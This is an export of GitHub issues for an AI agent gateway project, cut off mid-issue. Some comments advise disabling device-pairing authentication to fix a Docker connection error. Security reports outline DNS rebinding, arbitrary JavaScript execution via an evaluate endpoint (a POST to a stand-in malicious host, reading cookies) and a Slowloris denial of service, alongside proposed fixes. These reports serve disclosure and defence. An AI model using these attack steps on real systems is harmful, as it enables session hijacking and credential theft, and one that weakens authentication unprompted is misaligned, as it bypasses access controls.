          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4921#issuecomment-3882021901",
          "createdAt": "2026-02-11T04:13:14Z",
          "updatedAt": "2026-02-11T04:13:14Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4941,
      "title": "Dashboard \"pairing required\" (1008) when running gateway in Docker Desktop on Windows",
      "body": "# Environment\n- **OS**: Windows 11 ARM64\n- **Docker**: Docker Desktop (latest)\n- **OpenClaw**: 2026.1.29\n- **Gateway Mode**: Docker (`docker compose up openclaw-gateway`)\n\n## Problem\nWhen running the OpenClaw gateway inside Docker Desktop on Windows, the browser dashboard cannot connect. Every WebSocket connection fails with:\n\n```\ndisconnected (1008): pairing required\n```\n\n## Root Cause Analysis\nLooking at gateway logs, the issue is **Docker's NAT networking**:\n\n```\n[ws] closed before connect conn=8fabde36-... \nremote=172.18.0.1 fwd=n/a origin=http://127.0.0.1:18789\nhost=127.0.0.1:18789 code=1008 reason=pairing required\n```\n\n- Browser connects to `127.0.0.1:18789` → Docker NAT → Gateway sees `172.18.0.1`\n- Gateway treats `172.18.0.1` as an **external connection** (not localhost)\n- External connections require node pairing, which the browser cannot complete\n\n## Config (verified correct)\n```json\n{\n  \"gateway\": {\n    \"mode\": \"local\",\n    \"auth\": {\n      \"mode\": \"token\",\n      \"token\": \"<redacted>\"\n    },\n    \"bind\": \"lan\"\n  }\n}\n```\n\n## What I Tried (all failed)\n1. ✅ Token in URL: `/?token=...` - Still \"pairing required\"\n2. ✅ `trustedProxies: [\"172.18.0.0/16\"]` - Accepted but didn't fix\n3. ❌ `auth.mode: \"none\"` - Invalid config\n4. ❌ `auth.allowInsecureAuth: true` - Unknown key\n\n## Expected Behavior\nDashboard should connect when the token is correct, regardless of whether the connection arrives via Docker's internal NAT.\n\n## Suggested Fix\nAdd a config option like `gateway.auth.skipPairingForTokenAuth: true` or automatically trust connections when a valid token is provided in the WebSocket handshake.\n\n## Workaround\nRun the gateway natively on Windows (not in Docker) to get real localhost connections.\n\n---\n**Labels**: bug, windows, docker\n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4941",
      "createdAt": "2026-01-30T21:35:14Z",
      "updatedAt": "2026-02-11T04:13:11Z",
      "author": "AliNMackie",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows",
          "docker"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3828882712,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4941#issuecomment-3828882712",
          "createdAt": "2026-01-31T17:33:39Z",
          "updatedAt": "2026-01-31T17:33:39Z",
          "author": "alexminza",
          "body": "Gemini CLI suggested this config change:\n\n```json\n    \"controlUi\": {\n      \"allowInsecureAuth\": true\n    },\n```\n\n```\n> Just tell me what to change in the openclaw.json file\n\n✦ To fix the \"pairing required\" error and allow the Control UI to authenticate without a persistent device identity (which requires manual approval), add the\n  controlUi block to your gateway configuration.\n\n  In your `/Users/user/.openclaw/openclaw.json` file, update the gateway section to look like this:\n\n    1   \"gateway\": {\n    2     \"port\": 18789,\n    3     \"mode\": \"local\",\n    4     \"bind\": \"loopback\",\n    5     \"auth\": {\n    6       \"mode\": \"token\",\n    7       \"token\": \"REDACTED\"\n    8     },\n    9     \"controlUi\": {\n   10       \"allowInsecureAuth\": true\n   11     },\n   12     \"tailscale\": {\n   13       \"mode\": \"off\",\n   14       \"resetOnExit\": false\n   15     }\n   16   },\n\n  After saving the file, restart your Docker container to apply the changes:\n   1 docker compose restart openclaw-gateway\n\n  Why this is happening:\n  By default, OpenClaw requires every connecting device to be \"paired\" (approved by an administrator). Since the Control UI is running in an \"insecure\" context\n  (HTTP inside Docker), it cannot generate a persistent device identity. Setting allowInsecureAuth: true tells the gateway to trust the Control UI if it provides\n  the correct token, skipping the pairing requirement.\n```"
        },
        {
          "id": 3830250928,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4941#issuecomment-3830250928",
          "createdAt": "2026-02-01T03:24:55Z",
          "updatedAt": "2026-02-01T03:24:55Z",
          "author": "sundeepgupta",
          "body": "This worked for me on macOS:\n\nThat error is expected: the CLI/UI is sending a device identity, and because the gateway sees the connection as non‑local, it requires device pairing. You don’t have a paired operator yet, so everything is stuck.\n\nFast bootstrap (recommended):\n\nTemporarily disable device identity for the Control UI by adding to `openclaw.json`:\n\n```json\n{\n  \"gateway\": {\n    \"controlUi\": { \"dangerouslyDisableDeviceAuth\": true }\n  }\n}\n```\n\nRestart the gateway Docker container:\n\nIn the UI, approve the pending device pairing (Devices/Nodes section).\n\nRemove dangerouslyDisableDeviceAuth and restart again."
        },
        {
          "id": 3882021743,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4941#issuecomment-3882021743",
          "createdAt": "2026-02-11T04:13:10Z",
          "updatedAt": "2026-02-11T04:13:10Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4944,
      "title": "fix(discord): execApprovals handler missing gateway token",
      "body": "## Bug Description\n\nThe `DiscordExecApprovalHandler` in `src/discord/monitor/exec-approvals.ts` creates a `GatewayClient` without passing the `token` parameter, causing authentication failures when connecting to the gateway.\n\n## Error Message\n\n```\ndiscord exec approvals: connect error: unauthorized: gateway token missing (provide gateway auth token)\ngateway connect failed: Error: unauthorized: gateway token missing (provide gateway auth token)\n```\n\n## Root Cause\n\nIn the original implementation (commit 483fba41b, PR #1621), the `GatewayClient` was created without the `token` parameter:\n\n```typescript\nthis.gatewayClient = new GatewayClient({\n  url: this.opts.gatewayUrl ?? \"ws://127.0.0.1:18789\",\n  // missing: token\n  clientName: GATEWAY_CLIENT_NAMES.GATEWAY_CLIENT,\n  clientDisplayName: \"Discord Exec Approvals\",\n  mode: GATEWAY_CLIENT_MODES.BACKEND,\n  scopes: [\"operator.approvals\"],\n  ...\n});\n```\n\n## Proposed Fix\n\n1. Add `gatewayToken?: string` to `DiscordExecApprovalHandlerOpts`\n2. Pass `token: this.opts.gatewayToken` when creating `GatewayClient`\n3. In `provider.ts`, resolve gateway token from config (supporting both local and remote modes) and pass it to the handler\n\nHappy to submit a PR if needed.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4944",
      "createdAt": "2026-01-30T21:41:00Z",
      "updatedAt": "2026-02-11T04:13:09Z",
      "author": "webmastertorch",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882021672,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4944#issuecomment-3882021672",
          "createdAt": "2026-02-11T04:13:08Z",
          "updatedAt": "2026-02-11T04:13:08Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4949,
      "title": "[Bug]: Browser control server vulnerable to DNS rebinding attacks",
      "body": "## Summary\n\n**Severity:** P0/Critical (Score: 115/150)\n**CWE:** [CWE-350](https://cwe.mitre.org/data/definitions/350.html) - Reliance on Reverse DNS Resolution for a Security-Critical Action\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/browser/server.ts:33`\n\nThe browser control server binds to `127.0.0.1` but lacks Host header validation, making it vulnerable to DNS rebinding attacks. Combined with the evaluate endpoint (#4950), this allows remote arbitrary JavaScript execution in controlled browser tabs.\n\n**Why this is critical:** DNS rebinding turns a \"localhost-only\" server into a remotely exploitable one. The attack requires only that a victim visits a malicious website while the gateway is running. The attacker's page initially resolves to their server, then rebinds DNS to 127.0.0.1 after the browser caches the connection. All subsequent requests go to the victim's localhost but with the attacker's origin. This is a well-known attack class with proven exploits against development servers, IDEs, and local services.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | Requires victim to visit malicious site | 25/40 |\n| **Impact** | Remote code execution via evaluate endpoint | 45/50 |\n| **Exploitability** | Requires DNS rebinding setup | 20/30 |\n| **Verification** | file:line ✓, code ✓, attack steps ✓ | 25/30 |\n| **Total** | — | **115/150** |\n\n## Steps to reproduce\n1. Start the gateway with browser control enabled\n2. Host a malicious website that:\n   - Initially resolves to attacker's IP\n   - After TTL expires, rebinds DNS to 127.0.0.1\n3. Have victim visit malicious site\n4. After DNS rebind, site makes POST to `http://malicious.com:PORT/act` with `{kind: \"evaluate\", fn: \"malicious code\"}`\n5. JavaScript executes in victim's browser-controlled tabs\n\n## Expected behavior\nThe browser control server should validate the Host header to reject requests from rebinding attacks, or require authentication tokens.\n\n## Actual behavior\nThe server accepts requests from any origin as long as they reach 127.0.0.1, enabling DNS rebinding bypass.\n\n### Affected code location:\n\n**Browser Server** (`src/browser/server.ts:33`):\n```typescript\nconst server = await new Promise<Server>((resolve, reject) => {\n  const s = app.listen(port, \"127.0.0.1\", () => resolve(s));\n  s.once(\"error\", reject);\n});\n// No Host header validation\n// No authentication mechanism\n```\n\n## Environment\n- Version: latest (main branch)\n- OS: Any\n- Install method: Any\n\n## Impact\n- **Remote code execution**: Attacker can execute arbitrary JS in browser tabs\n- **Credential theft**: Access cookies, localStorage of controlled pages\n- **Session hijacking**: Impersonate user on any site open in controlled browser\n- **Network pivoting**: Use browser as proxy to internal network\n\n## Recommended fix\nAdd Host header validation:\n```typescript\napp.use((req, res, next) => {\n  const host = req.headers.host;\n  const allowedHosts = ['localhost', '127.0.0.1', `localhost:${port}`, `127.0.0.1:${port}`];\n  \n  if (!host || !allowedHosts.some(h => host === h || host.startsWith(h + ':'))) {\n    res.status(403).json({ error: 'Invalid Host header - possible DNS rebinding attack' });\n    return;\n  }\n  next();\n});\n```\n\nOr require authentication token:\n```typescript\nconst BROWSER_CONTROL_TOKEN = process.env.BROWSER_CONTROL_TOKEN || crypto.randomUUID();\napp.use((req, res, next) => {\n  if (req.headers['x-browser-control-token'] !== BROWSER_CONTROL_TOKEN) {\n    res.status(401).json({ error: 'Invalid or missing authentication token' });\n    return;\n  }\n  next();\n});\n```",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4949",
      "createdAt": "2026-01-30T21:44:39Z",
      "updatedAt": "2026-02-11T04:13:06Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3830629542,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4949#issuecomment-3830629542",
          "createdAt": "2026-02-01T08:43:11Z",
          "updatedAt": "2026-02-01T08:43:11Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 8.0 / 10.0 |\n| **Severity** | High |\n| **Vector** | CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N)\n"
        },
        {
          "id": 3882021585,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4949#issuecomment-3882021585",
          "createdAt": "2026-02-11T04:13:06Z",
          "updatedAt": "2026-02-11T04:13:06Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4950,
      "title": "[Bug]: Arbitrary JavaScript execution via browser evaluate endpoint when enabled",
      "body": "## Summary\n\n**Severity:** P0/Critical (Score: 130/150)\n**CWE:** [CWE-94](https://cwe.mitre.org/data/definitions/94.html) - Improper Control of Generation of Code ('Code Injection')\n**OWASP:** [A03:2021](https://owasp.org/Top10/A03_2021-Injection/) - Injection\n**File:** `src/browser/pw-tools-core.interactions.ts:227-257`\n\nWhen `evaluateEnabled=true`, the browser control server accepts arbitrary JavaScript via the `/act` endpoint and executes it directly via `eval()` in the browser context with no sanitization, sandboxing, or scope restriction.\n\n**Why this is critical:** This is arbitrary code execution in the browser context. While gated by a config flag, once enabled there are zero controls—any JavaScript can read cookies, access localStorage, manipulate the DOM, make fetch requests with the page's credentials, or exfiltrate data. Combined with DNS rebinding (#4949), this becomes remotely exploitable. The `eval()` pattern is the textbook example of dangerous code injection.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | Config-dependent (requires evaluateEnabled) | 25/40 |\n| **Impact** | Arbitrary code execution in browser | 50/50 |\n| **Exploitability** | Single POST request | 30/30 |\n| **Verification** | file:line ✓, code ✓, attack steps ✓ | 25/30 |\n| **Total** | — | **130/150** |\n\n## Steps to reproduce\n1. Configure with `evaluateEnabled: true`\n2. POST to `/act` with body: `{kind: \"evaluate\", fn: \"document.cookie\"}`\n3. Observe arbitrary JavaScript execution in the browser context\n\n## Expected behavior\nEven when evaluate is enabled, there should be:\n- Sandboxing or scope restrictions\n- Input validation against known-safe patterns\n- Audit logging of evaluated code\n- Rate limiting\n\n## Actual behavior\nThe `fnText` parameter is passed directly to `eval()` with no restrictions:\n\n### Affected code location:\n\n**Evaluate Implementation** (`src/browser/pw-tools-core.interactions.ts:227-257`):\n```typescript\nconst browserEvaluator = new Function(\n  \"fnBody\",\n  `\n  \"use strict\";\n  try {\n    var candidate = eval(\"(\" + fnBody + \")\");\n    return typeof candidate === \"function\" ? candidate() : candidate;\n  } catch (err) {\n    // ...\n  }\n`\n);\n```\n\n## Environment\n- Version: latest (main branch)\n- OS: Any\n- Install method: Any\n\n## Impact\n- **Session hijacking**: Read cookies, localStorage, sessionStorage\n- **Credential theft**: Capture form inputs, access saved passwords\n- **Data exfiltration**: Read page content, make authenticated requests\n- **Malware delivery**: Inject scripts, redirect users\n- **Lateral movement**: Access internal network resources via browser\n\n## Recommended fix\n1. Remove evaluate functionality entirely, or\n2. Implement a strict allowlist of safe operations:\n```typescript\nconst ALLOWED_EVALUATIONS = {\n  'getInnerText': (selector: string) => document.querySelector(selector)?.innerText,\n  'getValue': (selector: string) => (document.querySelector(selector) as HTMLInputElement)?.value,\n  // ... other specific, safe operations\n};\n\n// Reject arbitrary code, only allow predefined operations\nif (!ALLOWED_EVALUATIONS[operation]) {\n  throw new Error(`Unsupported evaluation: ${operation}`);\n}\n```",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4950",
      "createdAt": "2026-01-30T21:46:09Z",
      "updatedAt": "2026-02-11T04:13:04Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3830404847,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4950#issuecomment-3830404847",
          "createdAt": "2026-02-01T05:25:52Z",
          "updatedAt": "2026-02-01T05:25:52Z",
          "author": "coygeek",
          "body": "## Severity Clarification: CVSS 9.9 Critical — Vulnerable by Default\n\nI want to highlight a critical aspect that may have been underweighted in the original triage: **the vulnerable configuration is the default**.\n\n```typescript\n// src/browser/constants.ts:2\nexport const DEFAULT_BROWSER_EVALUATE_ENABLED = true;\n\n// src/hooks/config.ts:9\n\"browser.evaluateEnabled\": true,\n```\n\n### CVSS v3.1 Reassessment\n\nThe original report scored Reachability at 25/40 because it \"requires evaluateEnabled.\" But since `true` is the default, every installation is vulnerable out of the box. Here's the proper CVSS breakdown:\n\n| Metric | Value | Rationale |\n|--------|-------|-----------|\n| Attack Vector | **Network (N)** | Reachable via gateway API |\n| Attack Complexity | **Low (L)** | Single POST, no race conditions |\n| Privileges Required | **Low (L)** | Any authenticated client |\n| User Interaction | **None (N)** | Fully automated |\n| Scope | **Changed (C)** | Can exfiltrate to external domains |\n| Confidentiality | **High (H)** | Read cookies, localStorage, credentials |\n| Integrity | **High (H)** | Modify DOM, submit forms as user |\n| Availability | **Low (L)** | Can crash tabs |\n\n**Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L`  \n**Score:** [**9.9 / 10.0 (Critical)**](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L)\n\n### Why This Matters\n\nThe config flag isn't a security control — it's a feature toggle that happens to be on. If gateway credentials are ever compromised (phishing, token leak, insider threat), the attacker immediately gets arbitrary JavaScript execution in all browser tabs. No additional steps required.\n\n### Recommended Action\n\nFlip the default to secure-by-default:\n\n```diff\n- export const DEFAULT_BROWSER_EVALUATE_ENABLED = true;\n+ export const DEFAULT_BROWSER_EVALUATE_ENABLED = false;\n```\n\nUsers who need eval can opt in explicitly. Everyone else gets protection without lifting a finger."
        },
        {
          "id": 3832263280,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4950#issuecomment-3832263280",
          "createdAt": "2026-02-01T23:25:18Z",
          "updatedAt": "2026-02-01T23:25:18Z",
          "author": "coygeek",
          "body": "**Tracking fix**\n\nClosing #5257 as duplicate — consolidated here.\n\nKeeping this issue open until PR #3926 merges.\n\n**Summary of findings:**\n| Item | Focus | CVSS |\n|------|-------|------|\n| #4950 (this) | The `eval()` vulnerability | 9.9 Critical |\n| #5257 (dup) | Default-enabled config | 10.0 Critical |\n| PR #3926 | Fix: default to `false` | — |"
        },
        {
          "id": 3882021497,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4950#issuecomment-3882021497",
          "createdAt": "2026-02-11T04:13:04Z",
          "updatedAt": "2026-02-11T04:13:04Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4954,
      "title": "[Bug]: GatewayClient.request() has no timeout, causing indefinite hangs",
      "body": "## Summary\n\n**Severity:** P1/High (Score: 85/150)\n**CWE:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html) - Uncontrolled Resource Consumption\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/gateway/client.ts:382-407`\n\nThe `GatewayClient.request()` method returns a Promise that has no timeout mechanism. If the gateway server never responds (network partition, crash, packet loss), the promise hangs forever, leaking memory and blocking callers indefinitely.\n\n**Why this is critical:** Gateway client requests are used throughout the codebase for inter-service communication. Network partitions, server crashes, and packet loss are inevitable in distributed systems. Without timeouts, a single unresponsive gateway causes cascading hangs—callers block waiting for responses that never come, the `pending` Map accumulates entries that leak memory, and upstream timeouts (if any) don't clean up downstream state. The codebase already has a good example of timeout handling in `IMessageRpcClient`—this should follow the same pattern.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | Network conditions trigger (not attacker-controlled) | 20/40 |\n| **Impact** | Memory leak, workflow stalls | 25/50 |\n| **Exploitability** | Passive (network instability) | 15/30 |\n| **Verification** | file:line ✓, code ✓, positive example cited | 25/30 |\n| **Total** | — | **85/150** |\n\n## Steps to reproduce\n1. Establish a gateway client connection\n2. Make a request via `client.request('method', params)`\n3. Kill the gateway server without closing the connection cleanly\n4. Observe the request promise never resolves or rejects\n5. Memory in `this.pending` Map grows with each stuck request\n\n## Expected behavior\nRequests should timeout after a configurable duration (e.g., 30 seconds), rejecting with a timeout error and cleaning up the pending entry.\n\n## Actual behavior\nPromises stored in `this.pending` map have no timeout mechanism:\n\n### Affected code location:\n\n**Gateway Client** (`src/gateway/client.ts:382-407`):\n```typescript\nasync request<T = unknown>(\n  method: string,\n  params?: unknown,\n  opts?: { expectFinal?: boolean },\n): Promise<T> {\n  // ...\n  const p = new Promise<T>((resolve, reject) => {\n    this.pending.set(id, {\n      resolve: (value) => resolve(value as T),\n      reject,\n      expectFinal,\n    });\n  });\n  this.ws.send(JSON.stringify(frame));\n  return p;  // <-- No timeout!\n}\n```\n\n## Environment\n- Version: latest (main branch)\n- OS: Any\n- Install method: Any\n\n## Positive example in codebase\nThe `IMessageRpcClient.request()` (`src/imessage/client.ts:127-163`) has proper timeout handling:\n```typescript\nconst timeout = setTimeout(() => {\n  this.pending.delete(id);\n  reject(new Error(`RPC timeout for ${method}`));\n}, this.timeoutMs);\n```\n\n## Impact\n- **Memory leak**: Each hung request leaks a pending Map entry\n- **Workflow stalls**: Callers awaiting these promises block indefinitely\n- **Resource exhaustion**: Under partial network failures, many requests can accumulate\n- **No visibility**: No error or log indicates the hang\n\n## Recommended fix\nAdd timeout to GatewayClient.request():\n```typescript\nconst timeout = setTimeout(() => {\n  this.pending.delete(id);\n  reject(new Error(`Gateway request timeout for ${method}`));\n}, this.timeoutMs ?? 30000);\n\n// In the resolve/reject handlers:\nclearTimeout(timeout);\n```",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4954",
      "createdAt": "2026-01-30T21:49:14Z",
      "updatedAt": "2026-02-11T04:13:03Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "imessage"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3830579601,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4954#issuecomment-3830579601",
          "createdAt": "2026-02-01T08:05:04Z",
          "updatedAt": "2026-02-01T08:05:04Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 5.9 / 10.0 |\n| **Severity** | Medium |\n| **Vector** | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)\n"
        },
        {
          "id": 3882021435,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4954#issuecomment-3882021435",
          "createdAt": "2026-02-11T04:13:02Z",
          "updatedAt": "2026-02-11T04:13:02Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4955,
      "title": "[Bug]: downloadToFile() has no HTTP timeout, enabling Slowloris DoS",
      "body": "## Summary\n\n**Severity:** P0/Critical (Score: 100/150)\n**CWE:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html) - Uncontrolled Resource Consumption\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/media/store.ts:86-155`\n\nThe `downloadToFile()` function makes HTTP/HTTPS requests without setting a timeout. A malicious or misconfigured server can accept the connection and never send data (Slowloris-style), causing the download to hang indefinitely while holding the socket open.\n\n**Why this is critical:** Media downloads are triggered by user-submitted URLs in messages. An attacker can craft a message with a URL pointing to a malicious server that accepts connections but trickles data at 1 byte/minute. Each download holds a socket, file descriptor, and worker thread. With enough malicious URLs, an attacker can exhaust all download capacity with minimal bandwidth—a classic Slowloris attack. Unlike the size limit (which only triggers when data arrives), timeouts protect against the \"no data\" attack vector.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | User-submitted URLs in messages | 35/40 |\n| **Impact** | Worker starvation, resource exhaustion | 25/50 |\n| **Exploitability** | Single malicious URL per worker | 25/30 |\n| **Verification** | file:line ✓, code ✓, attack steps ✓ | 15/30 |\n| **Total** | — | **100/150** |\n\n## Steps to reproduce\n1. Host a malicious server that accepts connections but sends data extremely slowly (1 byte/minute)\n2. Send a message containing a URL to this server\n3. Observe the download hangs indefinitely\n4. Repeat with multiple URLs to exhaust download workers\n\n## Expected behavior\nHTTP requests should have connection and response timeouts (e.g., 30 second connection, 5 minute total).\n\n## Actual behavior\nNo timeout configured on the request:\n\n### Affected code location:\n\n**Media Store Download** (`src/media/store.ts:86-155`):\n```typescript\nasync function downloadToFile(\n  url: string,\n  dest: string,\n  headers?: Record<string, string>,\n  maxRedirects = 5,\n): Promise<{ headerMime?: string; sniffBuffer: Buffer; size: number }> {\n  return await new Promise((resolve, reject) => {\n    // ...\n    const req = requestImpl(parsedUrl, { headers, lookup: pinned.lookup }, (res) => {\n      // Response handler - no timeout configured\n    });\n    req.on(\"error\", reject);\n    req.end();  // <-- No timeout!\n  });\n}\n```\n\nWhile there's a 5MB size limit, it only triggers when data is received - not when no data arrives.\n\n## Environment\n- Version: latest (main branch)\n- OS: Any\n- Install method: Any (especially affects gateways processing user-submitted media URLs)\n\n## Impact\n- **Resource exhaustion**: Each slow download holds a socket and file descriptor\n- **Worker starvation**: Download workers become unavailable\n- **DoS vector**: Attacker can tie up all download capacity with minimal bandwidth\n- **No recovery**: Stuck downloads never release without process restart\n\n## Recommended fix\nAdd timeout to HTTP request:\n```typescript\nconst req = requestImpl(parsedUrl, {\n  headers,\n  lookup: pinned.lookup,\n  timeout: 30000  // 30 second connection timeout\n}, (res) => {\n  res.setTimeout(300000, () => {  // 5 minute response timeout\n    req.destroy(new Error('Download timeout'));\n  });\n  // ...\n});\nreq.on('timeout', () => {\n  req.destroy(new Error('Connection timeout'));\n});\n```",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4955",
      "createdAt": "2026-01-30T21:50:03Z",
      "updatedAt": "2026-02-11T04:13:01Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3830629601,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4955#issuecomment-3830629601",
          "createdAt": "2026-02-01T08:43:14Z",
          "updatedAt": "2026-02-01T08:43:14Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 7.5 / 10.0 |\n| **Severity** | High |\n| **Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)\n"
        },
        {
          "id": 3832533856,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4955#issuecomment-3832533856",
          "createdAt": "2026-02-02T02:00:29Z",
          "updatedAt": "2026-02-02T02:00:29Z",
          "author": "coygeek",
          "body": "Closing as duplicate of #6605 - same `downloadToFile()` timeout bug in `src/media/store.ts`."
        },
        {
          "id": 3832670069,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4955#issuecomment-3832670069",
          "createdAt": "2026-02-02T03:07:28Z",
          "updatedAt": "2026-02-02T03:07:28Z",
          "author": "coygeek",
          "body": "Reopening - this is the original filing. Later duplicates will be closed instead."
        },
        {
          "id": 3882021380,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4955#issuecomment-3882021380",
          "createdAt": "2026-02-11T04:13:00Z",
          "updatedAt": "2026-02-11T04:13:00Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4956,
      "title": "[Bug]: waitForWaConnection() has no timeout, can hang forever",
      "body": "## Summary\n\n**Severity:** P1/High (Score: 90/150)\n**CWE:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html) - Uncontrolled Resource Consumption\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/web/session.ts:164-185`\n\nThe `waitForWaConnection()` function waits for a WhatsApp socket to reach \"open\" or \"close\" state, but has no timeout. If the connection enters an intermediate state (perpetual reconnecting, limbo), the promise hangs forever.\n\n**Why this is critical:** WhatsApp connections are notoriously unstable—QR code scanning timeouts, authentication failures, and network interruptions are common. When a connection enters a \"connecting\" state and never transitions to \"open\" or \"close\", the promise hangs indefinitely. This blocks startup flows, prevents reconnection handlers from running, and leaks event listeners. In production, this manifests as a \"dead\" WhatsApp channel with no error logged—operators have no visibility into why messages aren't being processed.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | Network conditions trigger (not attacker-controlled) | 20/40 |\n| **Impact** | Channel unavailability, startup hang | 25/50 |\n| **Exploitability** | Passive (network instability) | 15/30 |\n| **Verification** | file:line ✓, code ✓, attack steps ✓ | 30/30 |\n| **Total** | — | **90/150** |\n\n## Steps to reproduce\n1. Initiate a WhatsApp Web connection\n2. Interrupt network during QR code scanning or authentication\n3. Observe the connection enters a reconnecting state\n4. `waitForWaConnection()` never resolves or rejects\n5. Login flows and reconnection handlers stall\n\n## Expected behavior\nConnection wait should timeout after a reasonable duration (e.g., 60 seconds), rejecting with a timeout error.\n\n## Actual behavior\nNo timeout mechanism - only resolves on \"open\" or \"close\":\n\n### Affected code location:\n\n**WhatsApp Session** (`src/web/session.ts:164-185`):\n```typescript\nexport async function waitForWaConnection(sock: ReturnType<typeof makeWASocket>) {\n  return new Promise<void>((resolve, reject) => {\n    const handler = (...args: unknown[]) => {\n      const update = (args[0] ?? {}) as Partial<ConnectionState>;\n      if (update.connection === \"open\") {\n        evWithOff.off?.(\"connection.update\", handler);\n        resolve();\n      }\n      if (update.connection === \"close\") {\n        